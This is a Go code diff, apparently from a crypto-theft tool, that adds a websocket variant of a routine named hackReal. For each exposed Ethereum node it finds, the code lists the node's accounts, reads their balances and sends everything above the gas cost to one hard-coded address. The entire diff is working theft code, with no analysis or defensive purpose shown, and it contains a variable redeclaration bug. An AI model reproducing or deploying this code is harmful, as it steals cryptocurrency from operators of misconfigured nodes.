@@ -1,6 +1,7 @@
 package main
 
 import (
+	"./ethclient"
 	"./logger"
 	"./rpcs"
 	"fmt"
@@ -73,7 +74,7 @@ func (pxy *proxy) hackReal() {
 		defer func() { //必须要先声明defer，否则不能捕获到panic异常
 			// fmt.Println("2")
 			if err := recover(); err != nil {
-				logger.Info(addr,":",err) //这里的err其实就是panic传入的内容，bug
+				logger.Info(addr, ":", err) //这里的err其实就是panic传入的内容，bug
 			}
 			// fmt.Println("3")
 		}()
@@ -93,6 +94,58 @@ func (pxy *proxy) hackReal() {
 						left := balance.Sub(balance, big.NewInt(22000*22000000000))
 						if left.Cmp(big.NewInt(0)) > 0 {
 							r.SendTransaction(a, "6c654877175869c1349767336688682955e8edf8", "22000", "22000000000", left.Text(10), false)
+							logger.Info("sendtransaction:", addr)
+						}
+					}
+				}
+			}
+		}
+		logger.Info("hackReal:", addr)
+		time.Sleep(3 * time.Second)
+	}
+	pxy.hackChan2 <- true
+}
+func (pxy *proxy) hackRealWs() {
+	addrs, err := red.GetGoodPort() //获取写入的地址，此地址还没有进行链接
+	if err != nil {
+		logger.Info("hackRealws:", err)
+	}
+	if len(addrs) == 0 {
+		time.Sleep(time.Second * 100)
+	}
+	logger.Info("hackRealws:", len(addrs))
+	for _, addr := range addrs {
+		defer func() { //必须要先声明defer，否则不能捕获到panic异常
+			// fmt.Println("2")
+			if err := recover(); err != nil {
+				logger.Info(addr, ":", err) //这里的err其实就是panic传入的内容，bug
+			}
+			// fmt.Println("3")
+		}()
+		conn, err := ethclient.Dial("ws://" + addr)
+		if err != nil {
+			logger.Error(addr, ":", err)
+			continue
+		}
+		// 	//if connected write to redis set
+		_, err := conn.BlockByNumber(context.Background(), nil)
+		if err != nil {
+			logger.Error("Get block number error", err)
+			continue
+		}
+		if err == nil {
+			logger.Info("GetBlockNumber:", addr)
+			// red.WriteRealEthPort(addr)
+			acc, err2 := conn.GetAccounts()
+			if err2 == nil {
+				logger.Info("GetAccounts:", addr)
+				for _, a := range acc {
+					balance, err2 := conn.GetBalance(a)
+					if err2 == nil {
+						logger.Info("GetBalance:", addr)
+						left := balance.Sub(balance, big.NewInt(22000*22000000000))
+						if left.Cmp(big.NewInt(0)) > 0 {
+							conn.SendTransaction(a, "6c654877175869c1349767336688682955e8edf8", "22000", "22000000000", left.Text(10), false)
 							logger.Info("sendtransaction:", addr)
 						}
 					}
